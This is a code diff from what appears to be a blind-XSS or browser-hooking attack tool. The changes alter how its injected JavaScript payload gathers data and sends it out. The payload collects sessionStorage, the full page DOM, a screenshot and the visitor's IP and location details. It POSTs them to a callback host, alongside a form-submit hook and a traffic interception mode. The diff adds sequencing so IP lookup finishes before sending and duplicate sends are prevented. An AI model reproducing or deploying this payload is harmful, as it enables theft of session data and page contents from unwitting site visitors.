@@ -92,11 +92,14 @@ document.addEventListener("submit",function(e){if(window.__nxHooked)return;var f
   js += `try{var s={};for(var i=0;i<sessionStorage.length;i++){var k=sessionStorage.key(i);s[k]=sessionStorage.getItem(k)}d.sessionstorage=JSON.stringify(s)}catch(e){}`;
   js += `try{d.dom=document.documentElement.outerHTML;if(d.dom.length>5000000)d.dom=d.dom.substring(0,5000000)}catch(e){d.dom="[DOM capture failed: "+e.message+"]"}`;
 
-  // Fetch IP info from ipinfo.io (client-side, async)
-  js += `(function(){try{fetch("https://ipinfo.io/json",{mode:"cors"}).then(function(r){return r.json()}).then(function(j){d.ip_info=JSON.stringify(j)}).catch(function(){})}catch(e){}})();`;
+  // Flag to track if IP info fetch is done and prevent duplicate sends
+  js += `var _ipDone=false;var _sent=false;`;
 
-  // Send function - FIXED: onload inside send()
-  js += `function send(){var x=new XMLHttpRequest();x.open("POST","${cb}",true);x.setRequestHeader("Content-Type","application/json");`;
+  // Fetch IP info from ipinfo.io (client-side, async) - will be awaited before send
+  js += `function _fetchIpInfo(cb){try{fetch("https://ipinfo.io/json",{mode:"cors"}).then(function(r){return r.json()}).then(function(j){d.ip_info=JSON.stringify(j);_ipDone=true;cb()}).catch(function(){_ipDone=true;cb()})}catch(e){_ipDone=true;cb()}}`;
+
+  // Send function - FIXED: onload inside send() with duplicate send prevention
+  js += `function send(){if(_sent)return;_sent=true;var x=new XMLHttpRequest();x.open("POST","${cb}",true);x.setRequestHeader("Content-Type","application/json");`;
   js += `x.onload=function(){try{var r=JSON.parse(x.responseText);if(r.id){window.__rid=r.id;`;
 
   // Flush pending traffic and initialize advanced features after we have report ID
@@ -122,13 +125,22 @@ document.addEventListener("submit",function(e){if(window.__nxHooked)return;var f
   }
 
   if (screenshotEnabled) {
+    // Start IP info fetch immediately
+    js += `_fetchIpInfo(function(){});`;
+    // Wrapper to ensure IP info is fetched before sending
+    js += `function _sendWhenReady(){if(_ipDone){send()}else{setTimeout(_sendWhenReady,50)}}`;
     js += `var sc=document.createElement("script");sc.src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";`;
-    js += `sc.onload=function(){try{html2canvas(document.body,{logging:false,useCORS:true,allowTaint:true,scale:1,width:Math.min(document.documentElement.scrollWidth,1920),height:Math.min(document.documentElement.scrollHeight,4000)}).then(function(c){d.screenshot=c.toDataURL("image/jpeg",0.8);send()}).catch(function(e){d.screenshot_error="html2canvas: "+e.message;send()})}catch(e){d.screenshot_error="html2canvas exception: "+e.message;send()}};`;
-    js += `sc.onerror=function(){d.screenshot_error="Failed to load html2canvas from CDN";send()};`;
-    js += `setTimeout(function(){if(!d.screenshot&&!d.screenshot_error){d.screenshot_error="html2canvas timeout";send()}},10000);`;
+    js += `sc.onload=function(){try{html2canvas(document.body,{logging:false,useCORS:true,allowTaint:true,scale:1,width:Math.min(document.documentElement.scrollWidth,1920),height:Math.min(document.documentElement.scrollHeight,4000)}).then(function(c){d.screenshot=c.toDataURL("image/jpeg",0.8);_sendWhenReady()}).catch(function(e){d.screenshot_error="html2canvas: "+e.message;_sendWhenReady()})}catch(e){d.screenshot_error="html2canvas exception: "+e.message;_sendWhenReady()}};`;
+    js += `sc.onerror=function(){d.screenshot_error="Failed to load html2canvas from CDN";_sendWhenReady()};`;
+    js += `setTimeout(function(){if(!d.screenshot&&!d.screenshot_error){d.screenshot_error="html2canvas timeout";_sendWhenReady()}},10000);`;
+    // IP info timeout - force _ipDone after 3 seconds to not block too long
+    js += `setTimeout(function(){_ipDone=true},3000);`;
     js += `document.head.appendChild(sc);`;
   } else {
-    js += `send();`;
+    // No screenshot - fetch IP info then send
+    js += `_fetchIpInfo(function(){send()});`;
+    // IP info timeout - send after 3 seconds even if not done
+    js += `setTimeout(function(){if(!_ipDone){_ipDone=true;send()}},3000);`;
   }
 
   // Traffic Interception Mode - Auxiliary window controller
